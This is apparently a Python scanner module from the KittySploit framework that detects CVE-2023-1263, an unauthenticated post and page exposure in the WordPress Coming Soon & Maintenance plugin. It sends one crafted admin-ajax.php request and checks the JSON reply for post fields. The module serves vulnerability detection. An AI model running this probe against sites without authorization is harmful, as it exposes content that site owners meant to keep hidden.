#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The plugin does not restrict access to published and non protected posts/pages when the maintenance mode is en."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Coming Soon & Maintenance < 4.1.7 - Unauthenticated Post/Page Access Detection',
        'description': 'The plugin does not restrict access to published and non protected posts/pages when the maintenance mode is enabled, allowing unauthenticated users to access them.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2023',
            'wordpress',
            'wpscan',
            'wp-plugin',
            'wp',
            'cmp-coming-soon-maintenance',
            'unauth',
            'niteothemes',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/2e07ffd9-8e82-4078-96aa-162ef78c417b',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-1263',
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/cmp-coming-soon-maintenance/cmp-coming-soon-maintenance-plugin-by-niteothemes-416-information-exposure',
            'https://wordpress.org/plugins/cmp-coming-soon-maintenance/',
            'https://plugins.trac.wordpress.org/browser/cmp-coming-soon-maintenance/tags/4.1.6/niteo-cmp.php#L2759',
        ],
        'cve': 'CVE-2023-1263',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=cmp_get_post_detail&id=1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"img":', '"date":', '"title":',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Coming Soon & Maintenance < 4.1.7 - Unauthenticated Post/Page Access detected', path=path)
            return True
        return False

